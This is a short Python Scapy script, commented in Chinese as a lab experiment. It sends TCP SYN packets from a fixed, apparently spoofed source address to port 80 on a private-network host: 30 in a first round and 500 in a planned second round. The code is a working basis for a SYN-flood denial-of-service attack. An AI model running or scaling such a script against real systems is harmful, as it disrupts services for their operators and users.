
from scapy.all import IP, TCP, RandShort, send

# 实验参数
source_ip = "192.168.3.101"
target_ip = "192.168.4.105"
target_port = 80

# 第一轮测试发送 30 个 SYN
# 第二轮修改为 500 个 SYN
count = 30

for i in range(count):
    # 构造 IP 层
    ip_packet = IP(src=source_ip, dst=target_ip)

    # 构造 TCP 层，设置 SYN 标志
    tcp_packet = TCP(
        sport=RandShort(),
        dport=target_port,
        flags="S"
    )

    # 组合 IP 和 TCP 报文
    syn_packet = ip_packet / tcp_packet

    # 发送报文
    send(syn_packet, verbose=False)

print(f"已完成 {count} 次 TCP SYN 测试发送")
